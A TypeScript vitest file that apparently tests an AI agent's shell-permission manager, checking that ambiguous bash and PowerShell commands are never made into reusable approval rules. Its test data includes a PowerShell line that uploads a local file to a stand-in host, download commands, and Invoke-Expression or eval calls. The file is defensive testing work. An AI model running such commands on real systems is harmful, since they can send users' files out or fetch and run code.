import "../../__tests__/support/trusted-powershell.js";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { mkdtempSync, realpathSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { PermissionManager } from "../permission-manager.js";
import { buildShellRuleApproval } from "../rules/shell-rule-approval.js";
import { checkShellPermission } from "../../__tests__/support/permission-lane.js";
import { inspectShellCommand } from "../rules/literal-shell-inspection.js";
import { inspectPowerShellCommand } from "../rules/powershell-exfiltration.js";
import { __resetSessionStoreForTest } from "../user-approval-store.js";
import { withCurrentShellRuleVersion } from "../../shared/shell-rule-version.js";
import type { ShellRuleDialect } from "../../shared/permissions-events.js";
let cwd: string;
let manager: PermissionManager;
beforeEach(() => {
  cwd = realpathSync(mkdtempSync(join(tmpdir(), "positive-permission-")));
  vi.stubEnv("AVE_HOME", join(cwd, "state"));
  __resetSessionStoreForTest();
  manager = new PermissionManager(join(cwd, "permissions.json"));
  manager.setMode("allow");
  manager.setRules([{ pattern: "*", action: "allow" }]);
});
afterEach(() => { __resetSessionStoreForTest(); vi.unstubAllEnvs(); rmSync(cwd, { recursive: true, force: true }); });
const REFUSED = [
  "npm exec printf ready '--call=printf done'", "npx printf ready '--call=printf done'",
  "powershell 'Write-Output(1);#x.ps1'", "pwsh -Command 'Write-Output ready' --unknown",
  "sort -o sorted.txt input.txt; printf ready", "uniq input.txt output.txt; cat output.txt",
  "git branch temporary; git status", "curl -osaved.txt https://x.invalid; printf ready",
  "curl -w '%output{out.txt}ready' https://x.invalid; cat out.txt",
  "printf '%n' PATH; git status", "rg -r", "constructor ready", "__proto__ ready",
  "constructor --unknown", "__proto__ --unknown", "bun run --future-option task", "deno future-command --unknown",
  "grep", "rg", "cut notes.txt", "Select-String -Path notes.txt",
] as const;
describe.each(["bash", "powershell"] as const)("closed positive command proof (%s)", (dialect: ShellRuleDialect) => {
  const cases = (dialect === "bash" ? [...REFUSED, "wget https://x.invalid/file; cat file"] : REFUSED).map((command) => ({ command, protectedMutation: command === "git branch temporary; git status" }));
  it.each(cases)("keeps unproven syntax outside reusable approval: $command", ({ command, protectedMutation }) => {
    const inspect = dialect === "bash" ? inspectShellCommand : inspectPowerShellCommand;
    expect(inspect(command, cwd).outcome).toBe("unproven");
    expect(buildShellRuleApproval(dialect, command, cwd, { allow: true, deny: true }).exactRule).toBeNull();
    for (const sandboxed of [false, true]) {
      expect(checkShellPermission(manager, cwd, "positive-session", command, dialect, sandboxed)).toMatchObject(protectedMutation
        ? { decision: "ask", forceModal: true, reasonCode: "protected-path" }
        : { decision: "allow", reasonCode: "rule-allow" });
      expect(checkShellPermission(manager, cwd, "positive-session", command, dialect, sandboxed, true)).toMatchObject(protectedMutation
        ? { decision: "deny", reasonCode: "no-approver" }
        : { decision: "allow", reasonCode: "rule-allow" });
    }
  });
});
it.each(["–", "—", "―"])("refuses unsupported parameter punctuation %s rather than treating it as data", (dash) => {
  for (const command of [`Write-Output ${dash}Unknown`, `Get-Content ${dash}Unknown notes.txt`, `Get-Content -Path ${dash}Unknown`, `Invoke-Expression ${dash}Verbose`, `Invoke-WebRequest -Uri https://x.invalid ${dash}OutFile:runner; Write-Output ready`]) {
    expect(inspectPowerShellCommand(command, cwd).outcome).toBe("unproven");
    expect(buildShellRuleApproval("powershell", command, cwd, { allow: true, deny: true }).exactRule).toBeNull();
    expect(checkShellPermission(manager, cwd, "positive-session", command, "powershell", true, true)).toMatchObject({ decision: "allow", reasonCode: "rule-allow" });
  }
});
it.each(["env Write-Output ready", "env iwr -Uri https://x.invalid -InFile notes.txt", "npx Write-Output ready", "npm exec -- Invoke-Expression 'dir'", "env eval 'ls'", "command Write-Output ready", "builtin Write-Output ready"])("does not use shell grammar for a delegated native command: %s", (command) => {
  manager.setRules([
    { pattern: "*", action: "allow" },
    withCurrentShellRuleVersion({ pattern: `PowerShell(${command})`, action: "allow" }),
  ]);
  expect(inspectPowerShellCommand(command, cwd).outcome).toBe("unproven");
  expect(buildShellRuleApproval("powershell", command, cwd, { allow: true, deny: true }).exactRule).toBeNull();
  for (const sandboxed of [false, true]) {
    expect(checkShellPermission(manager, cwd, "positive-session", command, "powershell", sandboxed)).toMatchObject({ decision: "allow", reasonCode: "rule-allow" });
    expect(checkShellPermission(manager, cwd, "positive-session", command, "powershell", sandboxed, true)).toMatchObject({ decision: "allow", reasonCode: "rule-allow" });
  }
});
